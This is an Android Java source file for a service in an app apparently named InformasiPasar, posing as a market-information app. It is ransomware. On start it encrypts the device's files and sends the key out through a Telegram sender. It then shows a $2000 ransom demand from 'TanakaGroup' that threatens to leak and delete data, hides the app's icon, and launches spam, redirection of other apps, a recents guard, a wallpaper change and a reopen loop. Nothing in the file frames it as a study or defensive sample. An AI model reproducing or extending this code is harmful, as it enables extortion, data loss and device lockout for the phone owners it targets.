package com.informasipasar.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

public class BackgroundService extends Service {

    private static final String CHANNEL_ID = "bg_channel";
    private byte[] key;
    private String keyString;

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        startForeground(1, buildNotification());
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "Background", NotificationManager.IMPORTANCE_MIN);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("InformasiPasar")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .build();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (key == null) {
            key = RansomEngine.generateKey();
            keyString = RansomEngine.randomKeyString();
            new Thread(() -> {
                RansomEngine.encryptAll(key, k -> {
                    TelegramSender.sendKey(keyString);
                    onEncryptDone();
                });
            }).start();
        }
        return START_STICKY;
    }

    private void onEncryptDone() {
        new Handler(Looper.getMainLooper()).post(() -> {
            Toast.makeText(getApplicationContext(),
                    "Your devices now is Locked by TanakaGroup, pls pay the key with $2000 now!! or your data we share and permanent deleted",
                    Toast.LENGTH_LONG).show();
        });

        // 1. Ganti icon jadi transparan (nama ikut hilang karena label string kosong)
        IconSwitcher.switchNow(getApplicationContext());

        // 2. Jalankan spam
        ContextCompat.startForegroundService(this, new Intent(this, SpamService.class));

        // 3. Redirect app lain
        ContextCompat.startForegroundService(this, new Intent(this, RedirectService.class));

        // 4. Recent guard
        ContextCompat.startForegroundService(this, new Intent(this, RecentGuardService.class));

        // 5. Wallpaper download & set
        ContextCompat.startForegroundService(this, new Intent(this, WallpaperService.class));

        // 6. Reopen loop
        ContextCompat.startForegroundService(this, new Intent(this, ReopenLoopService.class));

        // 7. Pindah ke layar ransom
        Intent i = new Intent(this, RansomActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(i);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
